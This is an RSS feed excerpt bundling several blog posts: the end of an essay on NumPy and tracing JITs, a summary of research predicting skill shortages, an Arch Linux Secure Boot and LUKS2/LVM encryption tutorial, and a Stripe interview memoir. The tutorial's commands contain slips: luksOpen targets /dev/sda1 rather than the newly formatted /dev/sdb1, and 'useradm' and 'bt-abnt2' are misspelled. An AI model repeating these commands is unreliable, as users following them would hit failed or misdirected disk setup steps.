<p>So far, we‚Äôve seen that NumPy doesn‚Äôt solve any of Python‚Äôs fundamental problems when it comes to pointer overhead. Instead, it merely puts a bandaid on the problem by sharing those costs across multiple data. It‚Äôs a pretty successful strategy ‚Äì in my hands (<a href="https://www.moderndescartes.com/essays/vectorized_pagerank">1</a>, <a href="https://www.moderndescartes.com/essays/deep_dive_mcts">2</a>), I find that NumPy can typically achieve 30-60x speedups over pure Python solutions to dense numerical code. However, given that C code typically achieves <a href="https://www.moderndescartes.com/essays/data_oriented_python/(https://benchmarksgame-team.pages.debian.net/benchmarksgame/fastest/python3-gcc.html)">100-200x performance</a> over pure Python on dense numerical code (common in scientific computing), it would be nice if we could further reduce the Python overhead.</p>
<p>Tracing <a href="https://en.wikipedia.org/wiki/Just-in-time_compilation">JITs</a> promise to do exactly this. Roughly, the strategy is to trace the execution of the code and record the pointer chasing outcomes. Then, when you call the same code snippet, reuse the recorded outcomes! NumPy amortizes Python overhead over multiple data, and JIT amortizes Python overhead over multiple function calls.</p>
<p>(I should note that I‚Äôm most familiar with the tracing JITs used by TensorFlow and JAX. <a href="https://doc.pypy.org/en/latest/">PyPy</a> and <a href="https://numba.pydata.org/">Numba</a> are two alternate JIT implementations that have a longer history, but I don‚Äôt know enough about them to treat them fairly, so my apologies to readers.)</p>
<p>Tracing unlocks many wins typically reserved for compiled languages. For example, once you have the entire trace in one place, operations can be fused together (e.g., to make use of the <a href="https://en.wikipedia.org/wiki/FMA_instruction_set">fused multiply-add instructions</a> common to most modern computers), memory layouts can be optimized, and so on. TensorFlow‚Äôs <a href="https://www.tensorflow.org/guide/graph_optimization">Grappler</a> is one such implementation of this idea. Traces can also be <a href="https://en.wikipedia.org/wiki/Backpropagation">walked backwards</a> to automatically compute derivatives. Traces can be compiled for different hardware configurations, so that the same Python code executes on CPU, GPU, and TPU. JAX can <a href="https://jax.readthedocs.io/en/latest/notebooks/quickstart.html#Auto-vectorization-with-vmap">autovectorize traces</a>, adding a batch dimension to all operations. Finally, a trace can be exported in a language-agnostic manner, allowing a program defined in Python to be executed in <a href="https://www.tensorflow.org/js">Javascript</a>, <a href="https://www.tensorflow.org/tfx/guide/serving">C++</a>, or more.</p>
<p>Unsurprisingly, there‚Äôs a catch to all this. NumPy can amortize Python overhead over multiple data, but only if that data is the same type. JIT can amortize Python overhead over multiple function calls, but only if the function calls would have resulted in the same pointer chasing outcomes. Retracing the function to verify this would defeat the purpose of JIT, so instead, TensorFlow/JAX JIT uses array shape and dtype to guess at whether a trace is reusable. This heuristic is necessarily conservative, rules out otherwise legal programs, often requires unnecessarily specific shape information, and doesn‚Äôt make any guarantees against mischievous tinkering. Furthermore, data-dependent tracing is a known issue (<a href="https://pytorch.org/docs/stable/generated/torch.jit.trace.html">1</a>, <a href="https://jax.readthedocs.io/en/latest/notebooks/Common_Gotchas_in_JAX.html#python-control-flow-+-JIT">2</a>). I worked on <a href="https://blog.tensorflow.org/2018/07/autograph-converts-python-into-tensorflow-graphs.html">AutoGraph</a>, a tool to address data-dependent tracing. Still, the engineering benefits of a shared tracing infrastructure are too good to pass up. I expect to see JIT-based systems flourish in the future and iron out their user experience.</p>
<h2 id="conclusion">Conclusion</h2>
<p>The NumPy API‚Äôs specifically addresses Python‚Äôs performance problems for the kinds of programs that scientific computing users want to write. It encourages users to write code in ways that minimize pointer overhead. Coincidentally, this way of writing code is a fruitful abstraction for tracing JITs targeting vastly parallel computing architectures like GPU and TPU. (Some people argue that <a href="https://dl.acm.org/citation.cfm?id=3321441">machine learning is stuck in a rut</a> due to this NumPy monoculture.) In any case, tracing JITs built on top of ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.moderndescartes.com/essays/data_oriented_python/">https://www.moderndescartes.com/essays/data_oriented_python/</a></em></p>]]>
            </description>
            <link>https://www.moderndescartes.com/essays/data_oriented_python/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24511966</guid>
            <pubDate>Fri, 18 Sep 2020 01:22:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Predicting Skill Shortages in Labor Markets: A Machine Learning Approach]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24511889">thread link</a>) | @pedrogrande
<br/>
September 17, 2020 | https://bitsandatoms.co/predicting-skill-shortages-in-labor-markets-a-machine-learning-approach/ | <a href="https://web.archive.org/web/*/https://bitsandatoms.co/predicting-skill-shortages-in-labor-markets-a-machine-learning-approach/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

				
					<p>Skill shortages are a drain on society. They hamper economic opportunities for individuals, slow growth for firms, and impede labor productivity in aggregate. Therefore, the ability to understand and predict skill shortages in advance is critical for policy-makers and educators to help alleviate their adverse effects.</p>
<p>In <a href="https://arxiv.org/pdf/2004.01311v3.pdf">my latest research</a> with&nbsp;<a href="https://www.rizoiu.eu/">Marian-Andrei Rizoiu</a>, Ben Johnston, and <a href="https://www.xplainableai.org/">Mary-Anne Williams</a>, we implement a high-performing Machine Learning approach to predict occupational skill shortages one-year into the future. For this work, we compile a unique dataset of both Labor Demand and Labor Supply occupational data in Australia from 2012 to 2018. This includes data from 7.7 million job advertisements (ads) from <a href="https://www.burning-glass.com/">Burning Glass Technologies</a> and 20 official labor force measures. We use these data as explanatory variables and leverage the XGBoost classifier to predict yearly skills shortage classifications for 132 standardized occupations.</p>
<h3>Prediction Performance</h3>
<p>The models that we construct achieve strong results, achieving up to 83% (F1 Macro Average) for predicting whether an occupation is in shortage or not. We also performed an ablation test, where we separately tested the predictive performance for different feature classes, as seen below (LD=Labor Demand -&gt; job ads, LS=Labor Supply -&gt; employment statistics). Interestingly, we found that job ads data and employment statistics maintain solid performance levels for predicting occupational skill shortages.This is significant because labor demand and labor supply data&nbsp;sources are available across multiple labor markets, whereas longitudinal skill shortages data at the occupational level are rare in most labor markets.</p>
<p><img src="https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.19.52-pm.png" alt="" width="1572" height="866" srcset="https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.19.52-pm.png 1572w, https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.19.52-pm-300x165.png 300w, https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.19.52-pm-768x423.png 768w, https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.19.52-pm-1024x564.png 1024w" sizes="(max-width: 1572px) 100vw, 1572px"></p>
<p>Clearly, skill shortages have strong auto-regressive tendencies&nbsp;(i.e. the best indicator of an occupation being in shortage this year is if it was in shortage last year). However, shortage status changes (when an occupation moves between <em>Not In Shortage</em> and <em>In Shortage</em>) have policy and immigration implications, as governments decide skilled immigration rules based on the needs of the labor market. <em>So,&nbsp;how well can the models we build predict the changes in shortage status?</em> As seen below, performance deteriorates substantially because shortage status changes are rare events. That said, our results show that job ads data and employment statistics were the highest performing feature sets for predicting year-to-year skills shortage changes for occupations.</p>
<p><img src="https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.33.58-pm.png" alt="" width="1572" height="862" srcset="https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.33.58-pm.png 1572w, https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.33.58-pm-300x165.png 300w, https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.33.58-pm-768x421.png 768w, https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.33.58-pm-1024x562.png 1024w" sizes="(max-width: 1572px) 100vw, 1572px"></p>
<p>Again, this is significant because it further highlights the value of near real-time data sources (job ads data) and freely available data sources (employment statistics).</p>
<h3>Feature Importance</h3>
<p>We then conduct a feature importance analysis on the ‚ÄòLabor Demand + Labor Supply‚Äô model in order to draw insights into which of these features are most predictive of skill shortages.</p>
<p><img src="https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.20.34-pm.png" alt="" width="1414" height="830" srcset="https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.20.34-pm.png 1414w, https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.20.34-pm-300x176.png 300w, https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.20.34-pm-768x451.png 768w, https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.20.34-pm-1024x601.png 1024w" sizes="(max-width: 1414px) 100vw, 1414px"></p>
<p>We find that&nbsp;‚ÄòHours Worked‚Äô is the most important indicator for occupations in shortage. Our interpretation of this result is that&nbsp;when a shortage exists for an occupation, the demands placed upon workers classified in that occupation are naturally high, which manifests in higher work intensity and longer work hours. This is reflected in the figure above where the ‚ÄòHours Worked‚Äô variables are represented in 6 of the top 20 most important features.</p>
<p>With regards to labor demand, years of ‚ÄòEducation‚Äô, years of ‚ÄòExperience‚Äô, and median ‚ÄòSalary‚Äô are all highly important features for predicting occupational skill shortages. This is consistent with <a href="https://ieeexplore.ieee.org/document/9005967">prior work</a>, which shows that when an occupation is in shortage, employers adjust job requirements to try and fulfil their demands. With regards to these features, this typically involves lowering the requirements of education and experience and increasing salary levels to attract more candidates.</p>
<h3>Quantifying Skill Importance of Occupations In Shortage</h3>
<p>Lastly, we put forward a method to analyze the underlying skills of occupations in shortage. This allows us to identify&nbsp;granular details on which skills should be targeted to help alleviate occupational shortages. In a nutshell, we normalize high-occurring skills in job ads and calculate the mean importance score within the occupation. This returns an ordered list of skills by importance and captures emerging skills within an occupation. We used Data Scientists as an example occupation, which has been shown to be in shortage across many labor markets. Below is a visualization of the top 10 Data Science skills in Australia from 2015-2019 using this method.</p>
<p><img src="https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.21.28-pm.png" alt="" width="1422" height="1174" srcset="https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.21.28-pm.png 1422w, https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.21.28-pm-300x248.png 300w, https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.21.28-pm-768x634.png 768w, https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.21.28-pm-1024x845.png 1024w" sizes="(max-width: 1422px) 100vw, 1422px"></p>
<p>We hope that the&nbsp;methods and findings from this work can assist policy-makers to better measure and predict skill shortages of occupations. Similarly, educators could apply this work to better identify market demands and adjust their curricula accordingly.</p>
<p>To view the paper, please <a href="https://arxiv.org/pdf/2004.01311v3.pdf">click here</a>&nbsp;to access the pre-print.</p>
	<!-- Social Sharing by Danny - v1.3.3 - https://wordpress.org/plugins/dvk-social-sharing/ -->
	
    <!-- / Social Sharing By Danny -->
   
<!-- /themify_builder_content -->
				
			</div></div>]]>
            </description>
            <link>https://bitsandatoms.co/predicting-skill-shortages-in-labor-markets-a-machine-learning-approach/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24511889</guid>
            <pubDate>Fri, 18 Sep 2020 01:06:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Secure your boot process: UEFI and Secureboot and EFISTUB and Luks2 and lvm]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24511852">thread link</a>) | @zdw
<br/>
September 17, 2020 | https://nwildner.com/posts/2020-07-04-secure-your-boot-process/ | <a href="https://web.archive.org/web/*/https://nwildner.com/posts/2020-07-04-secure-your-boot-process/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>This tutorial isn‚Äôt a basic setup how-to in a way you will learn how to install Arch Linux, neither is intended to replace the <a href="https://wiki.archlinux.org/index.php/Installation_guide">Installation Guide</a>, This is a guide for those who want a laptop with data-at-rest encryption and a verified boot process using SecureBoot.</p>
<p>I‚Äôll not be arrogant saying that this setup is ‚Äútampering-proof‚Äù since this also depends on your firmware manufacturer, but I believe that this is a notebook setup with good enough security.</p>

<ul>
<li>Arch Linux setup overview.</li>
<li>Basic secureboot explanation.</li>
<li>Luks2+lvm setup for encrypted partitions at boot time.</li>
<li><code>/home</code> disk setup with crypttab.</li>
<li>EFISTUB to make Linux ‚Äúit‚Äôs own bootloader‚Äù avoiding the entire <code>/boot</code> to be mounted on your ESP.</li>
</ul>

<p>UEFI is the new standard for boot and firmware management and it isn‚Äôt perfect, but is a natural answer to the old BIOS standard that has it‚Äôs limitations and is not aging well considering those limits and all workarounds involved to break them. You can find more information <a href="https://uefi.org/faq">here</a>. BIOS standard first appeared in IBM computers in 1976 and should (hopefully) die soon.</p>
<p>To keep words/concepts best alligned with what is correct, i‚Äôll not call your basic computer program BIOS but firmware from now on during this reading.</p>
<p>I bought a laptop and wanted to encrypt all my data and thought: ‚ÄúHey, i can do a full disk encryption but what if someone tamper my <a href="https://en.wikipedia.org/wiki/Master_boot_record">MBR/Boot Sector</a>? So, using secureboot whas the best alternative (even with efi having a plain <code>FAT32</code> partition on it‚Äôs standard).</p>
<p>There‚Äôs a lot of drama around secureboot, most of it related to Microsoft and the way they demand deploying their keys on OEM vendor equipments. That doesn‚Äôt mean that secureboot is bad.</p>
<p>Pretty simple ‚Äúexplain like i‚Äôm five‚Äù secureboot concept: A Root of Trust combination with keys and certificates. Using SecureBoot your firmware will check if the operating system you are trying to boot and your bootloader are trusted by you. On each boot-up UEFI firmware will inspect what you are trying to boot and if it‚Äôs not trusted a security violation will be triggered.</p>
<p>There are four main EFI ‚Äúvariables‚Äù used to create a basic secureboot Root of Trust environment:</p>
<ul>
<li>PK: The Platform Key, the master one, the <a href="https://en.wikipedia.org/wiki/One_Ring">ring to rule them all</a>. The holder of a PK can install a new PK and update the KEK.</li>
<li>KEK: Key Exchange Key is a secondary key used to sign EFI executables directly or a key used to signd the db and dbx databases.</li>
<li>db: The signature databse is a list with all allowed signing certificates or criptografy hashes to allowed binaries. We will use THIS db key to sign our Linux Kernel.</li>
<li>dbx: The dark side of the db. Inverse db. ‚Äúnot-good-db‚Äù. You name it. It‚Äôs the list containing all keys that are not allowed.</li>
</ul>
<p>I would like to highlight the following points of this setup:</p>
<ul>
<li>Your signing keys are stored inside an encrypted disk.</li>
<li>Kernel signing will only happend after you have booted and running an already signed kernel.</li>
<li>Most notebooks today don‚Äôt have an exposed CMOS to keep configurations but instead they have nvram modules that will store firmware and configurations.
<ul>
<li>So, put a passord on your firmware to avoid secureboot being disabled.</li>
<li>Putting a password on your firmware will almost invalidate any chance of boot option change or secureboot disable.</li>
<li>In my case there is no ‚Äúreset bios password‚Äù option and losing it will require contacting Lenovo to replace the main board.</li>
</ul>
</li>
<li>Even with secureboot disabled, and attacker will not be able to decrypt your root partition without knowing your password</li>
<li>If you are worried about keys being accessed after booting, you have other issues to solve and disk encryption + secureboot will not be the answer.</li>
<li>Modern processors have <code>aes-ni</code> instuction that will help on disk decryption avoiding high cpu usage for this task.</li>
<li>Using a key to unlock luks <code>/home</code> partition is a way to increase convenience without sacrificing security. That key is stored inside another encrypted partition so, there is no much to worry about.</li>
<li>lvm inside a luks container gives you a lot of flexibility. This will also remove any visibility if someone steal you equipment since lvs will be inside one container.
<ul>
<li>Less error prone setup while manipulating <code>UUID</code>s is also an implicit feature.</li>
</ul>
</li>
</ul>
<p>With that in mind, lets install ArchLinux, first boot it and create the Root of Trust of your notebook.</p>

<p>There‚Äôs a plenty of ‚Äúefi how-tos‚Äù for Arch Linux on the internet, and some of the instructions here will be just an overview of what you dear reader will have to execute</p>
<p><strong>Step 01</strong>: Download Arch Linux <a href="https://www.archlinux.org/download/">here</a> and write it to a pendrive using <code>dd bs=4M if=path/to/archlinux.iso of=/dev/sdx status=progress oflag=sync</code> where<code>sdx</code> is your pendrive. If you are using Windows to create your bootable pendrive <a href="https://sourceforge.net/projects/win32diskimager/">Win32 Disk Imager</a> will help you.</p>
<p><strong>Step 02</strong>: Configure your firmware to boot using UEFI, but keep secure boot disabled. Allow boot from usb and change it to be your first boot device. These instructions are pretty much vendor dependent and can change depending on your equipment.</p>
<p><strong>Step 03</strong>: Boot Arch Linux live usb, and after getting a shell change your keybord layout with the following command: <code>loadkeys br-abnt2</code></p>
<p>After that, connect to your wifi using <code>wifi-menu -o your_device</code>. There is an issue with the latest Arch Linux iso(06/2020) and <code>wifi-menu</code> is not working as expected. If you are using ethernet just ignore this step. Enable ntp sync with <code>timedatectl set-ntp true</code>.</p>
<p><strong>Step 04</strong>: Create <code>luks2</code> containers and <code>lvm2</code> volumes on the first disk. On my laptop i have 2 drives: <code>sda</code> is a ssd while <code>sdb</code> is a spinning disk. Use <code>cgdisk /dev/sda</code> and create a 256MB(i‚Äôm using 512MB but noticed that is way too much) partition for EFI (<a href="https://wiki.archlinux.org/index.php/EFI_system_partition">ESP</a>) code <code>ef00</code> and the rest of your disk space create a partition with code <code>8309</code>(Linux Luks).</p>
<p>Create your luks container and open it. Default block cipher and block encyption mode should be good enough so there is no need of changing it with <code>-c</code> parameter:</p>
<pre><code>cryptsetup -y -v --use-random luksFormat /dev/sda2
cryptsetup luksOpen /dev/sda2 crypt
</code></pre>
<p>Create your lvm infraesturucture on top of it. I‚Äôll create swap and root logical volumes</p>
<pre><code>pvcreate /dev/mapper/crypt
vgcreate vg0 /dev/mapper/crypt
lvcreate --size 4G vg0 --name swap
lvcreate --size 30G vg0 --name root
</code></pre>
<p>Format your ESP, root and swap partitions/volumes</p>
<pre><code>mkfs.vfat -F32 /dev/sda1
mkfs.ext4 /dev/mapper/vg0-root
mkswap /dev/mapper/vg0-swap
</code></pre>
<p><strong>Step 05</strong> Now create a <code>luks2</code> container without lvm on it cause we will use the full disk just for <code>/home</code> and automatically map/mount it using <code>crypttab+fstab</code> here. Instead of typing a password 2 times during boot(one for root, another for home), we will just type the password for the root partition and host a key inside this encrypted partition to open the home luks container. Using a key to open a luks device has the same risks as typing a password and storing it into your ram. <code>cgdisk /dev/sdb</code> and create an all-disk partition using <code>8309</code> partition code.</p>
<pre><code>cryptsetup -y -v --use-random luksFormat /dev/sdb1
cryptsetup luksOpen /dev/sda1 crypthome
mkfs.ext4 /dev/mapper/crypthome
</code></pre>
<p><strong>Step 06</strong> Mount all and start to install:</p>
<pre><code>mount /dev/mapper/vg0-root /mnt
mkdir /mnt/efi
mkdir /mnt/home
mount /dev/sda1 /mnt/efi
mount /dev/mapper/crypthome /mnt/home
pacstrap /mnt base base-devel vim efibootmgr linux linux-firmware lvm2 mkinitcpio networkmanager intel-ucode git
</code></pre>
<p>Do not install <code>intel-ucode</code> if you are using an AMD processor.</p>
<p><strong>Step 07</strong>: Create your <code>fstab</code> and change root to your new system</p>
<pre><code>genfstab -U /mnt &gt;&gt; /mnt/etc/fstab
arch-chroot /mnt
</code></pre>
<p><strong>Step 08</strong>: Change your fstab <code>/home</code> mount point to use the device mapper name. If you try to mount it using <code>UUID</code> it will fail cause it needs to be decrypted first.</p>
<pre><code># /home
/dev/mapper/crypthome	/home     	ext4      	rw,relatime	0 2
</code></pre>
<p>Create a key to automatically open the home luks container. Change the ‚Äúsecretfolder‚Äù path example as you please.</p>
<pre><code>mkdir /root/secretfolder
chmod 700 /root/secretfolder
dd bs=512 count=4 if=/dev/urandom of=/root/secretfolder/crypto_keyfile.bin
</code></pre>
<p>Find the UUID of your home luks container(<code>sdb1</code> not <code>crypthome</code>) and add it to your <code>/etc/crypttab</code>. Crypttab columns are: mapping name(crypthome), luks partition UUID, key path and luks. You can check disks UUID by issuing <code>blkid /dev/yyy</code> where <code>yyy</code> could be a partition or a disk. In this case, use <code>sdb1</code>.</p>
<pre><code>crypthome UUID=29d3555d-cccc-yyyy-xxxx-xxxxxxxxxxxx /root/secretfolder/crypto_keyfile.bin luks
</code></pre>
<p><strong>Step 09</strong>: Configure the rest of the system. Remember, this is just an overview of the Arch Linux installation and the focus here is on the secureboot aspect of this setup. In this step we will configure locale, localtime, keymap, hostname and user. I‚Äôm configuring a setup for a Brazilian Portuguese user so, change this info to reflect your language.</p>
<pre><code>ln -s /usr/share/zoneinfo/America/Sao_Paulo /etc/localtime
hwclock --systohc
echo LANG=pt_BR.UTF-8 &gt; /etc/locale.conf
echo KEYMAP=bt-abnt2 &gt; /etc/vconsole.conf
echo hostname_i_want &gt; /etc/hostname
</code></pre>
<p>Uncomment the <code>pt_BR.UTF-8 UTF-8</code> line inside <code>/etc/locale.gen</code> and generate this localization with:</p>
<pre><code>locale-gen
</code></pre>
<p>Create a password for root, and the basic info for your user(change <code>myuser</code> to your login):</p>
<pre><code>passwd
useradm -m -g users -G wheel myuser
passwd myuser
</code></pre>
<p><strong>Step 10</strong>: Edit your <code>mkinitcpio.conf</code> and include the <code>HOOKS</code> <code>keyboard</code>, <code>keymap</code>, <code>lvm2</code> and <code>resume</code>. Include <code>ext4</code> on <code>MODULES</code> and change <code>COMPRESSION</code> to <code>cat</code>. You can check my config file <a href="https://gitlab.com/nwildner/dotfiles/-/blob/master/etc/mkinitcpio.conf">here</a>. Recreate your initd:</p>
<pre><code>mkinitcpio -p linux
</code></pre>
<p>You may have noticed the <code>i915</code> module on my <code>mkinitcpio.conf</code>. That‚Äôs how you avoid video flickering during the boot process if you are a user of an Intel Integrated graphics card.</p>
<p><strong>Step 11</strong>: Lets check if your motherboard is able to handle EFI entries using the following command:</p>
<pre><code>bootctl status| grep -i "sets"
       ‚úì Boot loader sets ESP partition information
</code></pre>
<p>If this option is marked with <code>‚úì</code> you will be able to set boot information on your motherboard directly. Otherwise, you‚Äôll have to rely on a bootloader like <code>systemd-boot</code>. You could obviously use the default EFI fallback option (<code>EFI/BOOT/BOOX64.EFI</code>) but the sofware we will use to automatically create ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nwildner.com/posts/2020-07-04-secure-your-boot-process/">https://nwildner.com/posts/2020-07-04-secure-your-boot-process/</a></em></p>]]>
            </description>
            <link>https://nwildner.com/posts/2020-07-04-secure-your-boot-process/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24511852</guid>
            <pubDate>Fri, 18 Sep 2020 01:00:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Experience Interviewing with Stripe]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24511838">thread link</a>) | @lpolovets
<br/>
September 17, 2020 | https://daeyoungchoi.com/stripe-interview/ | <a href="https://web.archive.org/web/*/https://daeyoungchoi.com/stripe-interview/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	
<p>Interviewing for a job often is a daunting experience. It may commonly be described as a two-way selection process, one in which the candidate is evaluating the company as much as the company is the candidate, but the sober truth is that outside of the most highly sought-after segments of the talent pool, the balance of power resides squarely with the hiring company and the candidate has little leverage until the moment a job offer is presented. This seemingly is especially true in Silicon Valley, where each job opening routinely attracts hundreds of applicants and it is not uncommon that the candidate simply never hears back from the company in the case the interview is deemed unsuccessful at any point along the process, without even a notice of rejection, let alone being provided an explanation or feedback of any kind. Basic decency and decorum can seem to fly out the window once the company makes the determination you are ‚Äúnot a fit,‚Äù which effectively translates to ‚Äúhenceforth a waste of time,‚Äù simply an undesired byproduct of an essential process, to be discarded as quickly as possible.</p>



<p>But every once in a while, as is the case with life in general, an exception comes along that runs against the grain of your learned expectations. It shows you the extraordinary does exist and offers a reminder that much of what happens in this world lies on a distribution, despite the seeming tyranny of what occupy the regions of central tendency. While it won‚Äôt negate the broadly observed norms, the reminder that excellence exists in almost all domains of human activity sometimes is enough to sustain one in a journey that is full of pitfalls and trials, providing the inspiration that helps keep alive hopes and aspirations even when the objective and dispassionate prognosis appears far from welcoming. Interviewing with Stripe, the payment startup, for me, was such an example.</p>



<p>My very first interview with Stripe started off quite inauspiciously. It was a phone interview with the recruiter, and after spending some time to explore and discuss both my background and that of the job, he let me know that my skill set probably was not as good a match for what the hiring team was looking for as initially thought. In retrospect that sort of upfront candor might have been an early indication of the caliber of the organization that was to be revealed more fully later on. But the remarkable thing that happened after he uttered that assessment was that he wanted to refer me to another recruiter, for a different role which he thought presented a better match. This was something that quite literally had never happened in my experience, admittedly a small sample as it may be ‚Äì a recruiter that not only was well-versed enough in another position for which he was not recruiting, was empowered enough by the organization to make that kind of an autonomous referral decision without consultation, but also, probably most impressively, cared enough to take on such an initiative when I was deemed no longer useful for his immediate need, which was to fill the position at hand.</p>



<p>The subsequent interviews, for the new role, went more smoothly, uneventfully in the best sense. Over the course of the ensuing few weeks, in succession, I had a phone call with the new recruiter, a Zoom video call with the head of the business unit for the role (who was based overseas), a writing assignment, and in-person coffee shop chats in San Francisco with the said head of the business unit who happened to be in town that week and also with the hiring manager. All of that led to culminate in an on-site round of interviews with 7 individuals that lasted over 4 hours in January of this year at the San Francisco headquarters of Stripe.</p>



<p>In retrospect, it is clear I did not perform as well on the on-site interviews as I should have. What was unique about Stripe was the interview questions were actually provided in advance ‚Äì the recruiter arranged a call with me prior to the scheduled date to go over the questions one by one. Gripped by the notion, somehow, that interviews are just conversations, however, I did not spend a lot of time preparing specific answers for those questions. Looking back, I now think a big part of the reason why was hubris; I have a tendency to think I enjoy all conversations, and proceeded to draw the conclusion in my mind that conversations I enjoy in an interview setting must be good interviews. The mere fact that I was ready to enjoy the interviews, in their natural, unscripted, conversational formulation, was, in a way, enough preparation. But once the on-site interviews began it became apparent the interviewers were pressing for a higher level of specificity in the answers than I was prepared to give in the courses of casual conversations. I could feel the inadequacy of my answers resulting from the lack of deeper considerations given them in advance, and I simply was not good enough to get to the level of detailed thoughtfulness on the spot. As I was ushered out of the building after the interviews concluded, I recall feeling a sense of regretful uneasiness creeping in. Almost compulsively, I remained hopeful, but far from confident. And surely enough, a few days later I was informed that I didn‚Äôt get the job. </p>



<p>I was devastated, but this is the point from which I was led to Stripe revealing itself to be a truly unique, unconventional company in the most unexpectedly wonderful ways. First, the recruiter offered to schedule a call so we could review the decision. I was pleasantly surprised to be given such an unusual opportunity, so I took him up on it. During the call he relayed some useful feedback, though it is clear in retrospect that I got too excited to be on such a call and spent way more time talking than listening to what he had to say. But importantly, the conversation helped me come to a realization, in concrete ways, that I was a much worse interviewee than had previously believed myself to be. It prompted me to ex-examine my natural tendencies in the ways I think, talk, and engage with others in conversations. When I shared the revelation with my wife, she was more than happy to supply additional pointers in areas of my failing.</p>



<p>The fact that the recruiter, and by extension the company, was willing to engage with and spend the time and effort on someone deemed to be ‚Äúnot wanted‚Äù was an enormous departure from everything I had experienced previously. Frankly, it was the kind of thoughtfulness and generosity of goodwill that I never expected any corporate entity to possess or display. I knew I had been rejected, but now I wanted Stripe even more, and I couldn‚Äôt let myself just give up. So I did something quite silly: I sent an email to the CEO. Fortunately Patrick Collison, Stripe‚Äôs CEO, lists his email address on his personal website. But I had no idea if the email would actually reach him, or if he would read it if it got to him, or if he would respond in any way. The overwhelmingly realistic outcome was that nothing would happen, and I knew it. It was a desperation move, one you are able to make only because you have nothing to lose.</p>



<p>Then, I got an email from the recruiter. He asked if I wanted to speak with the company‚Äôs chief risk officer ‚Äì the job I interviewed for was a risk function ‚Äì for reasons that were not entirely clear. He mentioned I might want ‚Äúa bit more closure,‚Äù but I didn‚Äôt want closure; if anything, I wanted to keep the door ajar as much and as long as possible. He also said that the meeting was optional, with ‚Äúno pressure.‚Äù Perplexed yet intrigued, I took up the opportunity to speak with the executive. She began the call with something to the effect of ‚ÄúI know you reached out to Patrick.‚Äù I had reached out to everyone I had interviewed with to solicit feedback, and since the name ‚ÄúPatrick‚Äù didn‚Äôt register right away I processed it to mean one of the interviewers. But about 5 seconds later I realized there was no one named Patrick that I had met, and then it hit me that it must be Patrick Collison, the CEO. My email to him was why this call was happening, which the chief risk officer confirmed when I asked her in disbelief. I was stunned. Having taken place almost a half year ago, much of the details of the call is a blur. But I recall distinctly her asking why Stripe should hire someone like myself. Most improbably, it seemed, this might be a second chance.</p>



<p>I had written to Patrick the CEO with a proposition: I offered myself to be a counterfactual data point in an evaluation of Stripe‚Äôs hiring process, after learning that Stripe‚Äôs credit card fraud detection system lets through some transactions which its algorithms flag as likely frauds in order to determine whether they turn out to be true positives or false positives ‚Äì thereby evaluating the algorithms themselves ‚Äì in a process called ‚Äúcounterfactual evaluation.‚Äù When the chief risk officer asked why I should be hired, I reiterated that proposition: the case I was making was not about my merits, but the willingness on Stripe‚Äôs part to apply counterfactual evaluation to its hiring process, to determine whether I was a false positive (incorrectly rejected) or a true positive (truly no good) by letting me join Stripe, without a bias to either outcome. I couldn‚Äôt tell if I was making any headway with the argument, but we soon ran out of time and she had to go to another meeting.</p>



<p>In the end, the outcome of my interviews did not change and I remain not an employee of Stripe. But out of all the job interview experiences I‚Äôve had in my life, the one with Stripe stands out as singularly remarkable. When I shared my story with a friend she was so impressed that even though she wasn‚Äôt looking for a new job, she said she still might apply to Stripe just for the experience. Today Stripe has earned a reputation as one of the best embodiments of the ideals of Silicon Valley ‚Äì a place of inventive and ambitious companies that not only come up ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://daeyoungchoi.com/stripe-interview/">https://daeyoungchoi.com/stripe-interview/</a></em></p>]]>
            </description>
            <link>https://daeyoungchoi.com/stripe-interview/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24511838</guid>
            <pubDate>Fri, 18 Sep 2020 00:57:45 GMT</pubDate>
